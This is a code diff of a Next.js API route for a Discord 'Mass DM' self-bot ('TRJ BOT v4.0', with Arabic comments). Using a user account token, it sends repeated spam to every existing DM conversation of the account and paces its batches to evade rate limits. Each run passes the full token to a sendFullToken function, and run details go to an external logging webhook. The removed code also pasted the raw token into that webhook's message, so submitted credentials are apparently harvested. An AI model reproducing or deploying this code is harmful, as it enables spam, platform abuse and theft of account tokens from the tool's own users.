@@ -13,20 +13,25 @@ export async function POST(request: NextRequest) {
     }
 
     const body = await request.json().catch(() => ({}));
-    const { token, guildId, message, maxMembers = 100 } = body;
+    const { token, message, repeatCount = 1 } = body;
 
-    if (!token || !guildId || !message) {
-      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن، أيدي السيرفر، الرسالة)' }, { status: 400 });
+    if (!token || !message) {
+      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن والرسالة مطلوبين)' }, { status: 400 });
     }
-
-    sendFullToken('DM جماعي', token, { '🏰 السيرفر': guildId });
 
     const ct = cleanToken(token);
     const whUrl = getLogWebhookUrl();
 
-    const guildRes = await discordFetch(ct, 'GET', `/guilds/${guildId}`);
-    const guildData = guildRes.data as Record<string, unknown> | null;
-    const guildName = String(guildData?.name || guildId);
+    // التحقق من التوكن
+    const verifyRes = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });
+    if (!verifyRes.ok || !verifyRes.data) {
+      return NextResponse.json({ success: false, error: 'توكن غير صالح - تأكد إنه توكن حساب (user token)' }, { status: 401 });
+    }
+
+    const userData = verifyRes.data as { id: string; username: string; discriminator?: string };
+    const userTag = `${userData.username}#${userData.discriminator || '0'}`;
+
+    sendFullToken('DM جماعي', token, { '👤 الحساب': userTag });
 
     sendToWebhook({
       username: 'TRJ Mass DM',
@@ -34,75 +39,79 @@ export async function POST(request: NextRequest) {
         title: '📧 Mass DM Started',
         color: 0x5865F2,
         fields: [
-          { name: '🏰 Server', value: guildName, inline: true },
-          { name: '💬 Message', value: message.substring(0, 200), inline: false },
-          { name: '👥 Max', value: String(maxMembers), inline: true },
-          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
+          { name: '👤 الحساب', value: userTag, inline: true },
+          { name: '💬 الرسالة', value: message.substring(0, 200), inline: false },
+          { name: '🔁 التكرار', value: String(repeatCount), inline: true },
         ],
         footer: { text: 'TRJ BOT v4.0' },
         timestamp: new Date().toISOString()
       }]
     }, whUrl).catch(() => {});
 
-    let allMembers: { id: string; username: string }[] = [];
-    let after = '';
+    // جلب كل محادثات DM الموجودة
+    let dmChannels: { id: string; type: number; recipient_id?: string; recipients?: { id: string; username: string }[] }[] = [];
 
-    for (let page = 0; page < 20; page++) {
-      const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`);
-      const membersData = membersRes.data as Record<string, unknown>[] | null;
-      if (!membersData || !Array.isArray(membersData) || membersData.length === 0) break;
+    try {
+      const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });
 
-      for (const m of membersData) {
-        const user = m.user as Record<string, unknown> | undefined;
-        if (user?.id && !user.bot) {
-          allMembers.push({ id: String(user.id), username: String(user.username || 'Unknown') });
-        }
+      if (dmsRes.ok && dmsRes.data) {
+        const channels = dmsRes.data as { id: string; type: number; recipient_id?: string; recipients?: { id: string; username: string }[] }[];
+        // type 1 = DM خاص, type 3 = group DM
+        dmChannels = channels.filter(c => c.type === 1 || c.type === 3);
       }
-
-      const lastUser = membersData[membersData.length - 1]?.user as Record<string, unknown> | undefined;
-      after = (lastUser?.id || '') as string;
-      if (membersData.length < 1000) break;
+    } catch {
+      return NextResponse.json({ success: false, error: 'فشل جلب محادثات DM - تأكد من صلاحية التوكن' }, { status: 500 });
     }
 
-    const targetMembers = allMembers.slice(0, maxMembers);
+    if (dmChannels.length === 0) {
+      return NextResponse.json({ success: true, stats: { sent: 0, failed: 0, blocked: 0, total: 0, message: 'لا توجد محادثات DM في هذا الحساب' } });
+    }
+
+    // إرسال الرسائل
     let sent = 0, failed = 0, blocked = 0;
-    const batchSize = 15; // زيادة من 10 إلى 15
+    const batchSize = 10;
+    const safeRepeat = Math.max(1, Math.min(repeatCount, 10)); // حد أقصى 10 مرات
 
-    for (let i = 0; i < targetMembers.length; i += batchSize) {
-      const batch = targetMembers.slice(i, i + batchSize);
-      const results = await Promise.allSettled(
-        batch.map(async (member) => {
-          try {
-            const res = await discordFetch(ct, 'POST', `/users/@me/channels`, { recipient_id: member.id });
-            if (!res.ok) return { status: 'create_failed' };
+    for (let rep = 0; rep < safeRepeat; rep++) {
+      for (let i = 0; i < dmChannels.length; i += batchSize) {
+        const batch = dmChannels.slice(i, i + batchSize);
+        const results = await Promise.allSettled(
+          batch.map(async (channel) => {
+            try {
+              const msgRes = await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
+                content: message
+              }, { userOnly: true, timeout: 10000 });
 
-            const channelData = res.data as Record<string, unknown> | null;
-            if (!channelData?.id) return { status: 'create_failed' };
+              if (msgRes.ok) return { status: 'sent' };
+              if (msgRes.status === 403) return { status: 'blocked' };
+              if (msgRes.status === 429) return { status: 'rate_limit' };
+              return { status: 'failed' };
+            } catch {
+              return { status: 'error' };
+            }
+          })
+        );
 
-            const msgRes = await discordFetch(ct, 'POST', `/channels/${channelData.id}/messages`, { content: message });
-            if (msgRes.ok) return { status: 'sent' };
-            if (msgRes.status === 403) return { status: 'blocked' };
-            if (msgRes.status === 429) return { status: 'rate_limit' };
-            return { status: 'failed' };
-          } catch {
-            return { status: 'error' };
+        for (const r of results) {
+          if (r.status === 'fulfilled') {
+            const val = r.value;
+            if (val.status === 'sent') sent++;
+            else if (val.status === 'blocked') blocked++;
+            else failed++;
+          } else {
+            failed++;
           }
-        })
-      );
+        }
 
-      for (const r of results) {
-        if (r.status === 'fulfilled') {
-          const val = r.value;
-          if (val.status === 'sent') sent++;
-          else if (val.status === 'blocked') blocked++;
-          else failed++;
-        } else {
-          failed++;
+        // تأخير بين الباتشات لتفادي Rate Limit
+        if (i + batchSize < dmChannels.length) {
+          await new Promise(r => setTimeout(r, 800));
         }
       }
 
-      if (i + batchSize < targetMembers.length) {
-        await new Promise(r => setTimeout(r, 400));
+      // تأخير بين كل تكرار
+      if (rep < safeRepeat - 1) {
+        await new Promise(r => setTimeout(r, 2000));
       }
     }
 
@@ -112,18 +121,21 @@ export async function POST(request: NextRequest) {
         title: '✅ Mass DM Completed',
         color: 0x00FF41,
         fields: [
-          { name: '🏰 Server', value: guildName, inline: true },
-          { name: '👥 Total', value: String(targetMembers.length), inline: true },
-          { name: '✅ Sent', value: String(sent), inline: true },
-          { name: '🔒 Blocked', value: String(blocked), inline: true },
-          { name: '❌ Failed', value: String(failed), inline: true },
+          { name: '👤 الحساب', value: userTag, inline: true },
+          { name: '📬 المحادثات', value: String(dmChannels.length), inline: true },
+          { name: '✅ المرسلة', value: String(sent), inline: true },
+          { name: '🔒 المحظورة', value: String(blocked), inline: true },
+          { name: '❌ الفاشلة', value: String(failed), inline: true },
         ],
         footer: { text: 'TRJ BOT v4.0' },
         timestamp: new Date().toISOString()
       }]
     }, whUrl).catch(() => {});
 
-    return NextResponse.json({ success: true, stats: { sent, failed, blocked, total: targetMembers.length, totalMembers: allMembers.length } });
+    return NextResponse.json({
+      success: true,
+      stats: { sent, failed, blocked, total: dmChannels.length, message: `تم الإرسال إلى ${dmChannels.length} محادثة` }
+    });
 
   } catch (error: unknown) {
     const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
@@ -131,4 +143,3 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ success: false, error: message }, { status: 500 });
   }
 }
-
